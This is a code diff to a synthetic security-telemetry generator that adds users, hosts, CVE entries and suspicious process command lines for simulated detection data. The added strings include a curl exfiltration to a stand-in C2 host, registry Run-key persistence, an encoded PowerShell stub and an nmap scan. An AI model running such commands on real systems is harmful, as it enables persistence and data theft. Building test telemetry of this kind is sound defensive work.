@@ -137,7 +137,10 @@ class TelemetryGenerator:
             ("sec_analyst", "CORP", True), ("dev_lead", "ENGINEERING", False),
             ("service_sql", "CORP", True), ("guest_user", "GUEST", False),
             ("rpatel", "FINANCE", False), ("sjohansson", "SALES", False),
-            ("tkmurthy", "RESEARCH", True), ("cbohn", "IT_OPS", True), ("eporter", "LEGAL", False)
+            ("tkmurthy", "RESEARCH", True), ("cbohn", "IT_OPS", True), ("eporter", "LEGAL", False),
+            ("dba_ravi", "DATABASE", True), ("cloud_sec", "INFRA", True), ("qa_tester01", "QA", False),
+            ("soc_tier1", "SOC", False), ("soc_tier2", "SOC", True), ("ciso_exec", "EXECUTIVE", True),
+            ("audit_bot", "COMPLIANCE", False), ("intern_dan", "DEV", False), ("net_admin01", "NETWORK", True)
         ]
 
         hosts = [
@@ -158,7 +161,14 @@ class TelemetryGenerator:
             ("HOST-MAIL-01", "mail.corp.internal", "10.0.1.30", "HIGH"),
             ("HOST-PROXY-01", "proxy.corp.internal", "10.0.1.5", "MEDIUM"),
             ("HOST-FILE-SHARE-01", "files.corp.internal", "10.0.3.100", "HIGH"),
-            ("HOST-DEV-BUILD-01", "build.corp.internal", "10.0.3.200", "LOW")
+            ("HOST-DEV-BUILD-01", "build.corp.internal", "10.0.3.200", "LOW"),
+            ("HOST-K8S-MASTER-01", "k8s-master.corp.internal", "10.0.5.10", "CRITICAL"),
+            ("HOST-K8S-NODE-01", "k8s-node01.corp.internal", "10.0.5.11", "HIGH"),
+            ("HOST-K8S-NODE-02", "k8s-node02.corp.internal", "10.0.5.12", "HIGH"),
+            ("HOST-REDIS-CACHE-01", "redis01.corp.internal", "10.0.4.70", "MEDIUM"),
+            ("HOST-KAFKA-BROKER-01", "kafka01.corp.internal", "10.0.4.80", "HIGH"),
+            ("HOST-ELASTIC-SEARCH-01", "elastic01.corp.internal", "10.0.2.80", "HIGH"),
+            ("HOST-BASTION-JUMP", "bastion.corp.internal", "10.0.1.50", "CRITICAL")
         ]
 
         processes = [
@@ -176,12 +186,18 @@ class TelemetryGenerator:
             ("net.exe", "net group 'Domain Admins' /domain", True, 6120),
             ("schtasks.exe", "schtasks /create /tn 'Persistence' /tr 'cmd.exe'", True, 6300),
             ("docker.exe", "docker run -v /:/host -it ubuntu", False, 7100),
-            ("git.exe", "git clone http://github.corp.internal/repo.git", False, 7200)
+            ("git.exe", "git clone http://github.corp.internal/repo.git", False, 7200),
+            ("powershell.exe", "powershell -enc JABzACAAPQAgAE4AZQB3...", True, 9912),
+            ("reg.exe", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d malware.exe", True, 8214),
+            ("msbuild.exe", "msbuild.exe /p:Configuration=Release C:\\malware.csproj", True, 8740),
+            ("nmap.exe", "nmap -sS -p 1-1000 10.0.4.0/24", True, 7420),
+            ("curl.exe", "curl -X POST -d @stolen_data.csv https://c2.darknet.org", True, 9510)
         ]
 
         external_ips = [
             "198.51.100.44", "198.51.100.99", "185.220.101.5", "45.154.255.88", "194.26.29.112",
-            "91.240.118.170", "103.224.182.20", "185.191.171.12", "5.188.206.14", "193.106.191.80"
+            "91.240.118.170", "103.224.182.20", "185.191.171.12", "5.188.206.14", "193.106.191.80",
+            "89.248.165.74", "195.201.225.10", "45.146.164.110", "185.244.25.188", "104.244.72.115"
         ]
 
         cves = [
@@ -192,13 +208,17 @@ class TelemetryGenerator:
             ("CVE-2023-4966", 9.4, "Citrix Bleed Information Disclosure Vulnerability"),
             ("CVE-2024-1709", 10.0, "ScreenConnect Authentication Bypass"),
             ("CVE-2023-48788", 9.8, "Fortinet FortiClientEMS Remote Code Execution"),
-            ("CVE-2024-27198", 9.8, "JetBrains TeamCity Authentication Bypass")
+            ("CVE-2024-27198", 9.8, "JetBrains TeamCity Authentication Bypass"),
+            ("CVE-2024-38077", 9.8, "Windows Remote Desktop Licensing Service RCE"),
+            ("CVE-2023-38606", 8.8, "Apple Kernel Memory Manipulation Zero-Day"),
+            ("CVE-2024-23897", 9.8, "Jenkins CLI Arbitrary File Read Vulnerability"),
+            ("CVE-2023-46604", 9.8, "Apache ActiveMQ OpenWire Remote Code Execution")
         ]
 
         base_dt = self.base_time - datetime.timedelta(hours=3)
 
-        # Generate 85 background operational and security telemetry events
-        for idx in range(1, 86):
+        # Generate 190 background operational and security telemetry events
+        for idx in range(1, 191):
             t = base_dt + datetime.timedelta(minutes=idx * 2)
             evt_type = random.choice(["AUTHENTICATION", "PROCESS_SPAWN", "VULNERABILITY_EXPLOIT", "LATERAL_MOVEMENT", "DATA_EXFILTRATION"])
 
